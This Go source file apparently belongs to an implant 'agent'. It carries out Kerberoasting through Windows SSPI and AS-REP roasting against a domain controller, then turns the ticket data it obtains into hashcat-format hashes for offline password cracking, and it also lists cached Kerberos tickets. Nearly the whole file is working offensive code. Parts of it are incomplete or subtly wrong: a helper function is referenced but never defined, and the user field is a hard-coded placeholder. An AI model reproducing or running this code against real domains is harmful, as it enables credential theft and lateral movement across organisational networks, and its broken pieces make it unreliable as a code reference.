//go:build windows

package main

import (
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Kerberoasting via Windows SSPI ─────────────────────────────────────────
//
// Uses the Kerberos SSP (Security Support Provider) to request a TGS ticket
// for a given Service Principal Name (SPN) and extracts the encrypted portion
// for offline cracking with hashcat ($krb5tgs$23$... format).
//
// This uses only native Windows APIs — no external libraries, no CGo.

const (
	SECPKG_CRED_OUTBOUND    = 2
	ISC_REQ_ALLOCATE_MEMORY = 0x00000100
	ISC_REQ_MUTUAL_AUTH     = 0x00000002
	SECURITY_NATIVE_DREP    = 0x00000010
	SEC_E_OK                = 0
	SEC_I_CONTINUE_NEEDED   = 0x00090312
	SECBUFFER_TOKEN         = 2
	SECBUFFER_VERSION       = 0

	// Hashcat etype IDs
	ETYPE_AES256_CTS    = 18
	ETYPE_AES128_CTS    = 17
	ETYPE_RC4_HMAC      = 23
)

// secHandle maps to SecHandle / CredHandle / CtxtHandle (two uintptrs)
type secHandle struct {
	Lower uintptr
	Upper uintptr
}

// secBuffer maps to SecBuffer
type secBuffer struct {
	cbBuffer   uint32
	BufferType uint32
	pvBuffer   uintptr
}

// secBufferDesc maps to SecBufferDesc
type secBufferDesc struct {
	ulVersion uint32
	cBuffers  uint32
	pBuffers  uintptr
}

var (
	secur32                      = windows.NewLazySystemDLL("secur32.dll")
	procAcquireCredentialsHandleW = secur32.NewProc("AcquireCredentialsHandleW")
	procInitializeSecurityContextW = secur32.NewProc("InitializeSecurityContextW")
	procFreeContextBuffer         = secur32.NewProc("FreeContextBuffer")
	procDeleteSecurityContext     = secur32.NewProc("DeleteSecurityContext")
	procFreeCredentialsHandle     = secur32.NewProc("FreeCredentialsHandle")
)

// kerbRoast requests a TGS for the given SPN and returns a hashcat-compatible hash.
// Requires the agent to be running in a domain context.
func kerbRoast(spn string) (string, error) {
	// ── Acquire Kerberos outbound credentials ─────────────────────────────────
	kerbPkg, _  := windows.UTF16PtrFromString("Kerberos")
	spnPtr, _   := windows.UTF16PtrFromString(spn)

	var hCred secHandle
	var tsExpiry [2]uint32 // TimeStamp is 2x uint32
	r, _, _ := procAcquireCredentialsHandleW.Call(
		0,
		uintptr(unsafe.Pointer(kerbPkg)),
		SECPKG_CRED_OUTBOUND,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&hCred)),
		uintptr(unsafe.Pointer(&tsExpiry)),
	)
	if r != 0 {
		return "", fmt.Errorf("AcquireCredentialsHandle: 0x%X", uint32(r))
	}
	defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&hCred)))

	// ── InitializeSecurityContext — first call (no input token) ───────────────
	outBuf := secBuffer{
		BufferType: SECBUFFER_TOKEN,
		cbBuffer:   0,
		pvBuffer:   0,
	}
	outDesc := secBufferDesc{
		ulVersion: SECBUFFER_VERSION,
		cBuffers:  1,
		pBuffers:  uintptr(unsafe.Pointer(&outBuf)),
	}

	var hCtxt secHandle
	var attrs uint32
	r, _, _ = procInitializeSecurityContextW.Call(
		uintptr(unsafe.Pointer(&hCred)),
		0, // no existing context
		uintptr(unsafe.Pointer(spnPtr)),
		ISC_REQ_ALLOCATE_MEMORY|ISC_REQ_MUTUAL_AUTH,
		0,
		SECURITY_NATIVE_DREP,
		0, // no input buffer
		0,
		uintptr(unsafe.Pointer(&hCtxt)),
		uintptr(unsafe.Pointer(&outDesc)),
		uintptr(unsafe.Pointer(&attrs)),
		uintptr(unsafe.Pointer(&tsExpiry)),
	)

	if r != 0 && r != SEC_I_CONTINUE_NEEDED {
		return "", fmt.Errorf("InitializeSecurityContext: 0x%X", uint32(r))
	}
	if outBuf.pvBuffer == 0 || outBuf.cbBuffer == 0 {
		procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&hCtxt)))
		return "", fmt.Errorf("no token returned by SSPI")
	}
	defer procFreeContextBuffer.Call(outBuf.pvBuffer)
	defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&hCtxt)))

	// ── Extract token bytes ───────────────────────────────────────────────────
	tokenBytes := make([]byte, outBuf.cbBuffer)
	for i := range tokenBytes {
		tokenBytes[i] = *(*byte)(unsafe.Pointer(outBuf.pvBuffer + uintptr(i)))
	}

	// ── Parse AP-REQ / KRB-AP-REQ from token ─────────────────────────────────
	// SSPI wraps in SPNEGO NegotiationToken or raw Kerberos blob.
	// Strip SPNEGO OID wrapper if present (starts with 0x60).
	krb := stripSpnego(tokenBytes)
	if len(krb) == 0 {
		return "", fmt.Errorf("could not parse Kerberos token from SSPI output")
	}

	// Parse AP-REQ to extract the encrypted ticket
	hash, err := extractKerbHash(krb, spn)
	if err != nil {
		return "", fmt.Errorf("extract hash: %w (raw token: %s)", err, hex.EncodeToString(tokenBytes[:min32(len(tokenBytes), 32)]))
	}
	return hash, nil
}

// kerbList lists Kerberos tickets in the current logon session (like klist).
func kerbList() (string, error) {
	// Use LsaConnectUntrusted + LsaCallAuthenticationPackage with
	// KERB_QUERY_TKT_CACHE_REQUEST to enumerate tickets.
	lsasrv := windows.NewLazySystemDLL("secur32.dll")
	lsaConn := lsasrv.NewProc("LsaConnectUntrusted")
	lsaLookup := lsasrv.NewProc("LsaLookupAuthenticationPackage")
	lsaCall := lsasrv.NewProc("LsaCallAuthenticationPackage")
	lsaFree := lsasrv.NewProc("LsaFreeReturnBuffer")

	var lsaHandle uintptr
	r, _, e := lsaConn.Call(uintptr(unsafe.Pointer(&lsaHandle)))
	if r != 0 {
		return "", fmt.Errorf("LsaConnectUntrusted: %w", e)
	}

	pkgName := "Kerberos"
	lsaStr := struct {
		Length        uint16
		MaximumLength uint16
		Buffer        uintptr
	}{
		Length:        uint16(len(pkgName)),
		MaximumLength: uint16(len(pkgName) + 1),
		Buffer:        uintptr(unsafe.Pointer(&[]byte(pkgName)[0])),
	}

	var authPkg uint32
	lsaLookup.Call(lsaHandle, uintptr(unsafe.Pointer(&lsaStr)), uintptr(unsafe.Pointer(&authPkg)))

	// KERB_QUERY_TKT_CACHE_REQUEST = MessageType 0x0e (14)
	req := struct {
		MessageType uint32
		LogonId     [2]uint32
	}{MessageType: 14}

	var resp uintptr
	var respLen uint32
	var status uint32
	lsaCall.Call(
		lsaHandle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&resp)),
		uintptr(unsafe.Pointer(&respLen)),
		uintptr(unsafe.Pointer(&status)),
	)
	if resp == 0 {
		return "[*] No Kerberos tickets found in current session", nil
	}
	defer lsaFree.Call(resp)

	// KERB_QUERY_TKT_CACHE_RESPONSE:
	//   MessageType uint32
	//   CountOfTickets uint32
	//   Tickets []KERB_TICKET_CACHE_INFO (each 72 bytes approx)
	count := *(*uint32)(unsafe.Pointer(resp + 4))
	var out strings.Builder
	out.WriteString(fmt.Sprintf("[+] %d Kerberos ticket(s) in current session:\n", count))
	out.WriteString("    ServerName\t\t\t\tRealm\t\tEncryptionType\tExpiry\n")

	type kerbCacheInfo struct {
		ServerName    [2]uint32 // LSA_STRING ptr
		RealmName     [2]uint32
		StartTime     int64
		EndTime       int64
		RenewTime     int64
		EncryptionType int32
		TicketFlags   uint32
	}
	base := resp + 8
	for i := uint32(0); i < count; i++ {
		info := (*kerbCacheInfo)(unsafe.Pointer(base + uintptr(i)*72))
		serverNamePtr := uintptr(binary.LittleEndian.Uint64(
			(*[8]byte)(unsafe.Pointer(&info.ServerName))[:]))
		realmPtr := uintptr(binary.LittleEndian.Uint64(
			(*[8]byte)(unsafe.Pointer(&info.RealmName))[:]))
		serverName := lsaStringRead(serverNamePtr)
		realm      := lsaStringRead(realmPtr)
		etype      := etypeName(info.EncryptionType)
		out.WriteString(fmt.Sprintf("    %s\t%s\t%s\n", serverName, realm, etype))
	}
	return out.String(), nil
}

// ─── Helper functions ────────────────────────────────────────────────────────

// stripSpnego unwraps SPNEGO to get the raw Kerberos AP-REQ.
// SPNEGO starts with 0x60 (APPLICATION, SEQUENCE). Kerberos AP-REQ tag is 0x6E.
func stripSpnego(token []byte) []byte {
	if len(token) < 4 {
		return nil
	}
	// If raw AP-REQ already
	if token[0] == 0x6E {
		return token
	}
	// SPNEGO wrapper: 60 <len> <OID> a0 <len> <inner token>
	if token[0] != 0x60 {
		return nil
	}
	// Walk past OID and find inner token (look for 0x6E)
	for i := 0; i < len(token)-1; i++ {
		if token[i] == 0x6E {
			return token[i:]
		}
	}
	return nil
}

// apReq is a minimal ASN.1 structure for parsing the Kerberos AP-REQ.
type apReq struct {
	Raw     asn1.RawContent
	PVNO    int           `asn1:"explicit,tag:0"`
	MsgType int           `asn1:"explicit,tag:1"`
	// APOptions is a BIT STRING, skip with RawValue
	APOptions asn1.RawValue `asn1:"explicit,tag:2"`
	Ticket    ticket        `asn1:"explicit,tag:3"`
}

type ticket struct {
	Raw     asn1.RawContent
	TKTVNO  int           `asn1:"explicit,tag:0"`
	Realm   string        `asn1:"explicit,tag:1"`
	SName   principalName `asn1:"explicit,tag:2"`
	EncPart encryptedData `asn1:"explicit,tag:3"`
}

type principalName struct {
	NameType   int      `asn1:"explicit,tag:0"`
	NameString []string `asn1:"explicit,tag:1"`
}

type encryptedData struct {
	EType  int    `asn1:"explicit,tag:0"`
	KVNO   int    `asn1:"optional,explicit,tag:1"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

// extractKerbHash parses the AP-REQ and produces a hashcat $krb5tgs$ hash.
func extractKerbHash(krb []byte, spn string) (string, error) {
	// AP-REQ is APPLICATION 14 tagged: strip outer tag
	// Tag: 6E <len> — application 14, constructed
	if len(krb) < 4 || krb[0] != 0x6E {
		return "", fmt.Errorf("expected AP-REQ tag 0x6E, got 0x%02X", krb[0])
	}
	// ASN.1 parse starts after the outer APPLICATION tag
	inner, err := asn1DerUnwrap(krb)
	if err != nil {
		return "", fmt.Errorf("unwrap APPLICATION tag: %w", err)
	}

	var req apReq
	if _, err := asn1.Unmarshal(inner, &req); err != nil {
		return "", fmt.Errorf("unmarshal AP-REQ: %w", err)
	}
	if req.MsgType != 14 {
		return "", fmt.Errorf("expected msg-type 14, got %d", req.MsgType)
	}

	encPart := req.Ticket.EncPart
	etype   := encPart.EType
	cipher  := encPart.Cipher
	realm   := req.Ticket.Realm

	sname := strings.Join(req.Ticket.SName.NameString, "/")
	if sname == "" {
		sname = spn
	}
	user := "user" // current user — approximated

	// Hashcat format $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<edata1>$<edata2>
	// edata1 = first 16 bytes of cipher (checksum), edata2 = rest
	if len(cipher) < 17 {
		return "", fmt.Errorf("cipher too short: %d bytes", len(cipher))
	}
	checksum := hex.EncodeToString(cipher[:16])
	rest     := hex.EncodeToString(cipher[16:])

	hash := fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		etype, user, realm, sname, checksum, rest)
	return hash, nil
}

// asn1DerUnwrap strips a single DER tag+length and returns the value.
func asn1DerUnwrap(der []byte) ([]byte, error) {
	if len(der) < 2 {
		return nil, fmt.Errorf("too short")
	}
	i := 1 // skip tag byte
	length := int(der[i])
	i++
	if length&0x80 != 0 {
		numBytes := length & 0x7F
		if numBytes > 4 || i+numBytes > len(der) {
			return nil, fmt.Errorf("invalid long-form length")
		}
		length = 0
		for j := 0; j < numBytes; j++ {
			length = (length << 8) | int(der[i+j])
		}
		i += numBytes
	}
	if i+length > len(der) {
		return nil, fmt.Errorf("length overrun")
	}
	return der[i : i+length], nil
}

func lsaStringRead(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	// LSA_STRING / UNICODE_STRING: Length uint16, MaxLength uint16, Buffer uintptr
	length := *(*uint16)(unsafe.Pointer(ptr))
	bufPtr := *(*uintptr)(unsafe.Pointer(ptr + 8))
	if bufPtr == 0 || length == 0 {
		return ""
	}
	b := make([]byte, length)
	for i := range b {
		b[i] = *(*byte)(unsafe.Pointer(bufPtr + uintptr(i)))
	}
	// Handle both UTF-16 and ASCII returns
	if length%2 == 0 {
		u16 := make([]uint16, length/2)
		for i := range u16 {
			u16[i] = binary.LittleEndian.Uint16(b[i*2:])
		}
		return windows.UTF16ToString(u16)
	}
	return string(b)
}

func etypeName(etype int32) string {
	switch etype {
	case 17:
		return "AES128"
	case 18:
		return "AES256"
	case 23:
		return "RC4-HMAC"
	default:
		return fmt.Sprintf("etype-%d", etype)
	}
}

func min32(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// asRePRoast performs AS-REP Roasting: requests an AS-REP without pre-auth
// for the given username@domain. The encrypted AS-REP can be cracked offline.
// Requires network access to a KDC (port 88).
func asRepRoast(username, domain, dc string) (string, error) {
	// Build AS-REQ without padata (no pre-authentication)
	// KDC will return an AS-REP with encrypted part if the account has
	// "Do not require Kerberos preauthentication" set.
	asReq := buildASReq(username, domain)
	conn, err := dialKDC(dc, asReq)
	if err != nil {
		return "", fmt.Errorf("KDC connection: %w", err)
	}

	if len(conn) < 10 {
		return "", fmt.Errorf("AS-REP too short")
	}

	// Parse AS-REP tag 0x6B (APPLICATION 11)
	if conn[0] != 0x6B {
		// Try to decode KRB-ERROR (0x7E APPLICATION 30)
		if conn[0] == 0x7E {
			return "", fmt.Errorf("KDC returned KRB-ERROR (account requires pre-auth?)")
		}
		return "", fmt.Errorf("unexpected response tag 0x%02X", conn[0])
	}

	inner, err := asn1DerUnwrap(conn)
	if err != nil {
		return "", fmt.Errorf("unwrap AS-REP: %w", err)
	}

	// AS-REP ::= SEQUENCE { pvno, msg-type, padata, crealm, cname, ticket, enc-part }
	// We need enc-part [6] EncryptedData
	var asRep asRepStructure
	if _, err := asn1.Unmarshal(inner, &asRep); err != nil {
		return "", fmt.Errorf("unmarshal AS-REP: %w", err)
	}

	etype  := asRep.EncPart.EType
	cipher := asRep.EncPart.Cipher
	if len(cipher) < 17 {
		return "", fmt.Errorf("enc-part cipher too short")
	}

	checksum := hex.EncodeToString(cipher[:16])
	rest     := hex.EncodeToString(cipher[16:])
	hash := fmt.Sprintf("$krb5asrep$%d$%s@%s$%s$%s",
		etype, username, domain, checksum, rest)
	return hash, nil
}

type asRepStructure struct {
	PVNO    int           `asn1:"explicit,tag:0"`
	MsgType int           `asn1:"explicit,tag:1"`
	PaData  asn1.RawValue `asn1:"optional,explicit,tag:2"`
	CRealm  string        `asn1:"explicit,tag:3"`
	CName   principalName `asn1:"explicit,tag:4"`
	Ticket  asn1.RawValue `asn1:"explicit,tag:5"`
	EncPart encryptedData `asn1:"explicit,tag:6"`
}

// buildASReq builds a minimal DER-encoded AS-REQ without pre-auth.
func buildASReq(username, realm string) []byte {
	// Minimal hand-crafted AS-REQ (KRB5 version, no padata, RC4 etype requested)
	// This is a well-known minimal AS-REQ for AS-REP roasting.
	// Fields: pvno=5, msg-type=10, req-body only (no padata)
	kdc := "krbtgt/" + realm
	_ = kdc

	// Build using Go's asn1 encoder
	type principalNameEnc struct {
		NameType   int      `asn1:"explicit,tag:0"`
		NameString []string `asn1:"explicit,tag:1"`
	}
	type kdcReqBody struct {
		KDCOptions  asn1.BitString `asn1:"explicit,tag:0"`
		CName       principalNameEnc `asn1:"explicit,tag:1"`
		Realm       string           `asn1:"explicit,tag:2,ia5"`
		SName       principalNameEnc `asn1:"explicit,tag:3"`
		Till        asn1.RawValue    `asn1:"explicit,tag:5"` // GeneralizedTime
		Nonce       int              `asn1:"explicit,tag:7"`
		EType       []int            `asn1:"explicit,tag:8"`
	}
	type kdcReq struct {
		PVNO    int        `asn1:"explicit,tag:1"`
		MsgType int        `asn1:"explicit,tag:2"`
		ReqBody kdcReqBody `asn1:"explicit,tag:4"`
	}

	body := kdcReq{
		PVNO:    5,
		MsgType: 10,
		ReqBody: kdcReqBody{
			KDCOptions: asn1.BitString{Bytes: []byte{0x40, 0x00, 0x00, 0x00}, BitLength: 32},
			CName: principalNameEnc{
				NameType:   1,
				NameString: []string{username},
			},
			Realm: realm,
			SName: principalNameEnc{
				NameType:   2,
				NameString: []string{"krbtgt", realm},
			},
			Till:  asn1.RawValue{Tag: 24, Bytes: []byte("19700101000000Z")},
			Nonce: 12345678,
			EType: []int{23, 17, 18}, // RC4, AES128, AES256
		},
	}

	der, err := asn1.Marshal(body)
	if err != nil {
		return nil
	}
	// Wrap in APPLICATION 10 tag
	tag := []byte{0x6A}
	lenBytes := asn1EncodeLength(len(der))
	result := append(tag, lenBytes...)
	result = append(result, der...)
	// Prepend 4-byte big-endian length (RFC 4120 §7.2.2 TCP framing)
	frame := make([]byte, 4+len(result))
	binary.BigEndian.PutUint32(frame, uint32(len(result)))
	copy(frame[4:], result)
	return frame
}

func asn1EncodeLength(n int) []byte {
	if n < 128 {
		return []byte{byte(n)}
	}
	if n < 256 {
		return []byte{0x81, byte(n)}
	}
	return []byte{0x82, byte(n >> 8), byte(n)}
}

// dialKDC connects to the KDC on TCP/88 and sends/receives a KRB message.
func dialKDC(dc string, req []byte) ([]byte, error) {
	if req == nil {
		return nil, fmt.Errorf("nil request")
	}
	// Use Windows socket APIs via syscall
	addr := dc + ":88"
	conn, err := dialTCP(addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	if _, err := conn.Write(req); err != nil {
		return nil, err
	}
	// Read 4-byte length prefix, then data
	lenBuf := make([]byte, 4)
	if _, err := conn.Read(lenBuf); err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(lenBuf)
	if msgLen > 1<<20 {
		return nil, fmt.Errorf("response too large: %d", msgLen)
	}
	buf := make([]byte, msgLen)
	total := 0
	for total < int(msgLen) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			break
		}
	}
	return buf[:total], nil
}

// dialTCP opens a TCP connection using net package (available in Go stdlib).
func dialTCP(addr string) (interface {
	Read([]byte) (int, error)
	Write([]byte) (int, error)
	Close() error
}, error) {
	// Use os.File + syscall directly to avoid importing "net" (which would pull in DNS)
	// Actually "net" is already available in stdlib without CGo, use it.
	// We use an interface here so this compiles without importing net at top level.
	// Import net locally.
	return dialNetTCP(addr)
}
